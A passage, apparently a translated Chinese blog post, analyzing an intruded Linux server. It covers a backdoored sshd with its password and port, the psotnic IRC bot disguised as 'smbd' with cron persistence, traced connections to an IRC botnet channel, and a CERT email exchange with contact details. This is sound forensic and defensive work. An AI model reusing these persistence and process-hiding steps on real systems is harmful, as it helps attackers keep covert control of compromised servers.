<p style="text-align: center;"><a href="http://s9.51cto.com/wyfs01/M00/1E/85/wKioOVIyccTBL1IXAAFcnTvNkRs768.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;' onmousewheel = 'javascript:return big(this)' alt="rq1" src="http://s9.51cto.com/wyfs01/M00/1E/85/wKioOVIyccTBL1IXAAFcnTvNkRs768.jpg" /></a></p>

<p>所以&rdquo;zibi.joe.149&Prime;是后门的密码,&rdquo;54098&Prime;是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下：</p>

<p style="text-align: center;"><a href="http://s1.51cto.com/wyfs01/M00/1E/83/wKioJlIyccSjBaCDAAB0BmGLyBk455.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;' onmousewheel = 'javascript:return big(this)' alt="rq2" src="http://s1.51cto.com/wyfs01/M00/1E/83/wKioJlIyccSjBaCDAAB0BmGLyBk455.jpg" /></a></p>

<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.&rdquo;psotnic0.2.5.tar.gz&rdquo;就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为&rdquo;smbd&rdquo;,来达到隐藏的目的。</p>

<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了。</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>vi&nbsp;conf&nbsp;</span></span></li><li><span>vi&nbsp;conf1&nbsp;</span></li><li class="alt"><span>....&nbsp;</span></li><li><span>./smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li class="alt"><span>./smbd&nbsp;-c&nbsp;conf1&nbsp;</span></li><li><span>./smbd&nbsp;conf&nbsp;</span></li><li class="alt"><span>./smbd&nbsp;conf1&nbsp;</span></li><li><span>./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li></ol></pre>

<p></p>

<p>让我们执行一下382这条命令,看看会发生什么。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Adding:&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Adding:&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf1&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Added&nbsp;2&nbsp;psotnics&nbsp;to&nbsp;cron&nbsp;</span></li></ol></pre>

<p></p>

<p>哇!它添加了cron定时任务.赶紧看一看：</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;crontab&nbsp;-l&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf1&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li></ol></pre>

<p></p>

<p></p>

<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;</span></span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[*]&nbsp;Acting&nbsp;as&nbsp;LEAF&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Config&nbsp;loaded&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Going&nbsp;into&nbsp;background&nbsp;[pid:&nbsp;5724]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:/var/.x/psotnic#&nbsp;./smbd&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[*]&nbsp;Acting&nbsp;as&nbsp;LEAF&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Config&nbsp;loaded&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Going&nbsp;into&nbsp;background&nbsp;[pid:&nbsp;5727]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:/var/.x/psotnic#&nbsp;</span></li></ol></pre>

<p></p>

<p>用&rdquo;ps&rdquo;命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;ps&nbsp;axuw&nbsp;|&nbsp;grep&nbsp;smb&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3799&nbsp;&nbsp;0.0&nbsp;&nbsp;0.4&nbsp;&nbsp;8592&nbsp;2156&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11:00&nbsp;&nbsp;&nbsp;0:00&nbsp;/usr/sbin/smbd&nbsp;-D&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3808&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;8592&nbsp;&nbsp;896&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11:00&nbsp;&nbsp;&nbsp;0:00&nbsp;/usr/sbin/smbd&nbsp;-D&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5724&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;1648&nbsp;&nbsp;772&nbsp;pts/2&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;12:47&nbsp;&nbsp;&nbsp;0:00&nbsp;./smbd&nbsp;conf&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5727&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;1640&nbsp;&nbsp;764&nbsp;pts/2&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;12:47&nbsp;&nbsp;&nbsp;0:00&nbsp;./smbd&nbsp;conf1&nbsp;</span></li></ol></pre>

<p></p>

<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用&rdquo;strace&rdquo;命令来看看它做了什么：</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;strace&nbsp;-p&nbsp;5727&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;connect(3,&nbsp;{<span class="attribute">sa_family</span><span>=</span><span class="attribute-value">AF_INET</span><span>,&nbsp;</span><span class="attribute">sin_port</span><span>=</span><span class="attribute-value">htons</span><span>(9714),&nbsp;</span><span class="attribute">sin_addr</span><span>=</span><span class="attribute-value">inet_addr</span><span>(&quot;83.18.74.235&quot;)},&nbsp;16)&nbsp;=&nbsp;-1&nbsp;EINPROGRESS&nbsp;(Operation&nbsp;now&nbsp;in&nbsp;progress)&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;connect(4,&nbsp;{<span class="attribute">sa_family</span><span>=</span><span class="attribute-value">AF_INET</span><span>,&nbsp;</span><span class="attribute">sin_port</span><span>=</span><span class="attribute-value">htons</span><span>(6667),&nbsp;</span><span class="attribute">sin_addr</span><span>=</span><span class="attribute-value">inet_addr</span><span>(&quot;195.159.0.92&quot;)},&nbsp;16)&nbsp;=&nbsp;-1&nbsp;EINPROGRESS&nbsp;(Operation&nbsp;now&nbsp;in&nbsp;progress)&nbsp;</span></span></li></ol></pre>

<p></p>

<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;83.18.74.235&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;manhattan.na.pl.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;195.159.0.92&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;ircnet.irc.powertech.no.&nbsp;</span></li></ol></pre>

<p></p>

<p>又是一个波兰的ip.另外一个ip,&rdquo;ircnet.irc.powertech.no&rdquo;是&rdquo;irc.powertech.nof&rdquo;的别名.是挪威一个著名的irc服务器。</p>

<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了&rdquo;irc.powertech.no&rdquo;,加入了&rdquo;#aik&rdquo;频道。</p>

<p></p>

<p id="highlighter_465610">&nbsp;</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>:irc.powertech.no&nbsp;001&nbsp;578PAB9NB&nbsp;:Welcome&nbsp;to&nbsp;the&nbsp;Internet&nbsp;Relay&nbsp;Network&nbsp;578PAB9NB!~op@ti231210a080-3666.bb.online.no&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;002&nbsp;578PAB9NB&nbsp;:Your&nbsp;host&nbsp;is&nbsp;irc.powertech.no,&nbsp;running&nbsp;version&nbsp;2.11.1p1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:578PAB9NB!~op@ti231210a080-3666.bb.online.no&nbsp;JOIN&nbsp;:#aik&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;353&nbsp;578PAB9NB&nbsp;@&nbsp;#aik&nbsp;:578PAB9NB&nbsp;kknd&nbsp;raider&nbsp;brandyz&nbsp;jpi&nbsp;conf&nbsp;xerkoz&nbsp;IpaL&nbsp;vvo&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;366&nbsp;578PAB9NB&nbsp;#aik&nbsp;:End&nbsp;of&nbsp;NAMES&nbsp;list.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~op&nbsp;ti231210a080-3666.bb.online.no&nbsp;irc.powertech.no&nbsp;578PAB9NB&nbsp;G&nbsp;:0&nbsp;op&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~kknd&nbsp;ti231210a080-3666.bb.online.no&nbsp;irc.hitos.no&nbsp;kknd&nbsp;H&nbsp;:2&nbsp;kknd&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~raider&nbsp;mobitech-70.max-bc.spb.ru&nbsp;*.dotsrc.org&nbsp;raider&nbsp;G&nbsp;:4&nbsp;raider&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~brandyz&nbsp;mobitech-70.max-bc.spb.ru&nbsp;*.dotsrc.org&nbsp;brandyz&nbsp;G&nbsp;:4&nbsp;brandyz&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~jpi&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;jpi&nbsp;G&nbsp;:8&nbsp;jpi&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~conf&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;conf&nbsp;G&nbsp;:7&nbsp;conf&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~xerkoz&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;xerkoz&nbsp;H&nbsp;:7&nbsp;xerkoz&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;lm&nbsp;campus19.panorama.sth.ac.at&nbsp;*.at&nbsp;IpaL&nbsp;H&nbsp;:5&nbsp;.LaPi.9@.IRCNet..&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~vvo&nbsp;ppp86-7.intelcom.sm&nbsp;*.tiscali.it&nbsp;vvo&nbsp;H&nbsp;:6&nbsp;vvo&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;315&nbsp;578PAB9NB&nbsp;#aik&nbsp;:End&nbsp;of&nbsp;WHO&nbsp;list.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>这些仅仅是加入#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;viper42&nbsp;[~viper42@trinity.gnist.org]&nbsp;has&nbsp;joined&nbsp;#aik&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[Users&nbsp;#aik]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[&nbsp;578PAB9NL]&nbsp;[&nbsp;conf]&nbsp;[&nbsp;jpi&nbsp;]&nbsp;[&nbsp;raider&nbsp;]&nbsp;[&nbsp;vvo&nbsp;&nbsp;&nbsp;]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[&nbsp;brandyz&nbsp;&nbsp;]&nbsp;[&nbsp;IpaL]&nbsp;[&nbsp;kknd]&nbsp;[&nbsp;viper42]&nbsp;[&nbsp;xerkoz]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;Irssi:&nbsp;#aik:&nbsp;Total&nbsp;of&nbsp;10&nbsp;nicks&nbsp;[0&nbsp;ops,&nbsp;0&nbsp;halfops,&nbsp;0&nbsp;voices,&nbsp;10&nbsp;normal]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;Irssi:&nbsp;Join&nbsp;to&nbsp;#aik&nbsp;was&nbsp;synced&nbsp;in&nbsp;1&nbsp;secs&nbsp;</span></li></ol></pre>

<p></p>

<p></p>

<p>我发现我朋友的服务器使用的昵称是&rdquo;578PQB9NB&rdquo;,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀&rdquo;\*-GTW&rdquo;,只有一个没有：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;IpaL&nbsp;[lm@campus19.panorama.sth.ac.at]&nbsp;</span></span></li><li><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;ircname&nbsp;&nbsp;:&nbsp;LaPi@IRCNet&nbsp;</span></li><li class="alt"><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;channels&nbsp;:&nbsp;#relaks&nbsp;#ping&nbsp;@#seks&nbsp;#aik&nbsp;@#ogame.pl&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#pingwinaria&nbsp;#hattrick&nbsp;#trade&nbsp;#admin&nbsp;@#!sh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;server&nbsp;&nbsp;&nbsp;:&nbsp;*.at&nbsp;[\o\&nbsp;&nbsp;\o/&nbsp;&nbsp;/o/]&nbsp;</span></li></ol></pre>

<p></p>

<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>$&nbsp;dig&nbsp;+short&nbsp;campus19.panorama.sth.ac.at&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;193.170.51.84&nbsp;</span></li></ol></pre>

<p></p>

<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:</p>

<p></p>

<p id="highlighter_156327">

<table border="0" cellpadding="0" cellspacing="0">

    <tbody>

        <tr>

            <td>

            <pre><ol class="dp-xml"><li class="alt"><span><span>From:&nbsp;Alexander&nbsp;Talos&nbsp;via&nbsp;RT&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;To:&nbsp;larstra@ifi.uio.no&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Subject:&nbsp;Cracker&nbsp;at&nbsp;campus19.panorama.sth.ac.at&nbsp;(193.170.51.84)&nbsp;&nbsp;[ACOnet&nbsp;CERT&nbsp;#38603]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Date:&nbsp;Fri,&nbsp;18&nbsp;May&nbsp;2007&nbsp;18:22:43&nbsp;+0200&nbsp;(CEST)&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Reply-To:&nbsp;cert@aco.net&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;-----BEGIN&nbsp;PGP&nbsp;SIGNED&nbsp;MESSAGE-----&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Hash:&nbsp;SHA1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Hej!&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;On&nbsp;Fri&nbsp;May&nbsp;18&nbsp;14:45:03&nbsp;2007,&nbsp;larstra@ifi.uio.no&nbsp;wrote:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;I&nbsp;have&nbsp;been&nbsp;tracking&nbsp;down&nbsp;cracker&nbsp;which&nbsp;connected&nbsp;from&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;campus19.panorama.sth.ac.at&nbsp;(193.170.51.84).&nbsp;The&nbsp;user,&nbsp;which&nbsp;</span></span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Ouch.&nbsp;panorama.sth.ac.at&nbsp;is&nbsp;a&nbsp;dormitory&nbsp;with&nbsp;about&nbsp;4k&nbsp;rooms&nbsp;all&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;behind&nbsp;a&nbsp;NAT&nbsp;gateway&nbsp;-&nbsp;it&nbsp;will&nbsp;be&nbsp;very&nbsp;hard&nbsp;to&nbsp;get&nbsp;hold&nbsp;of&nbsp;the&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;miscreant.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;This&nbsp;incident&nbsp;will,&nbsp;in&nbsp;the&nbsp;long&nbsp;run,&nbsp;definitely&nbsp;help&nbsp;me&nbsp;getting&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;rid&nbsp;of&nbsp;the&nbsp;NAT&nbsp;boxes&nbsp;in&nbsp;setups&nbsp;like&nbsp;that,&nbsp;but&nbsp;right&nbsp;now,&nbsp;we&nbsp;will&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;have&nbsp;to&nbsp;make&nbsp;do&nbsp;with&nbsp;what&nbsp;we&nbsp;have.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;Please&nbsp;investigate&nbsp;the&nbsp;host&nbsp;in&nbsp;question.&nbsp;Perhaps&nbsp;is&nbsp;this&nbsp;a&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;compromised&nbsp;host&nbsp;on&nbsp;your&nbsp;network&nbsp;acting&nbsp;as&nbsp;a&nbsp;jumpstation&nbsp;for&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Sure,&nbsp;and&nbsp;even&nbsp;in&nbsp;a&nbsp;NATed&nbsp;environment,&nbsp;this&nbsp;is&nbsp;still&nbsp;possible.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Btw,&nbsp;you&nbsp;did&nbsp;a&nbsp;great&nbsp;job&nbsp;in&nbsp;analysing&nbsp;the&nbsp;compromised&nbsp;machine!&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;I'll&nbsp;let&nbsp;you&nbsp;know&nbsp;when&nbsp;I&nbsp;have&nbsp;either&nbsp;further&nbsp;questions&nbsp;or&nbsp;any&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;interesting&nbsp;results.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Cheers,&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Alexander&nbsp;Talos&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;-&nbsp;--&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;IT-Security,&nbsp;Universitaet&nbsp;Wien,&nbsp;ACOnet&nbsp;CERT&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;T:&nbsp;+43-1-4277-14351&nbsp;&nbsp;M:&nbsp;+43-664-60277-14351&nbsp;</span></li></ol></pre>

            </td>

            <td>&nbsp;</td>

        </tr>

    </tbody>

</table>

</p>

<p></p>

<p>看起来我不够幸运。</p>

<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口。</p>

<p>连接到&rdquo;83.18.74.235&Prime;的流量看起来很混乱.只好再次用strace命令：</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;strace&nbsp;-f&nbsp;./smbd&nbsp;conf1&nbsp;&amp;</span><span class="tag">&gt;</span><span>&nbsp;/root/dump.strace&nbsp;</span></span></li></ol></pre>

<p></p>

<p>跟预期的一样,有很多输出,其中一个是它尝试启动&rdquo;BitchX&rdquo;,这是一个irc客户端.但是失败了,因为BitchX没有安装：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;sh:&nbsp;&quot;,&nbsp;4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;4&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;BitchX:&nbsp;not&nbsp;found&quot;,&nbsp;17)&nbsp;=&nbsp;17&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;n&quot;,&nbsp;1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;close(2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0&nbsp;</span></li></ol></pre>

<p></p>

<p>下面的截图是tcpdump抓到流量的一部分：</p>

<p style="text-align: center;"><a href="http://s1.51cto.com/wyfs01/M01/1E/83/wKioJlIyccSSRa_0AAGpmBBA9v0021.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;' onmousewheel = 'javascript:return big(this)' alt="rq3" src="http://s1.51cto.com/wyfs01/M01/1E/83/wKioJlIyccSSRa_0AAGpmBBA9v0021.jpg" /></a></p>

<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是&rdquo;irc.hitos.no&rdquo;,位于挪威的特罗姆斯郡。</p>

<p>入侵者除了这些,还运行了一个叫&rdquo;hide&rdquo;的脚本来清除日志：</p>

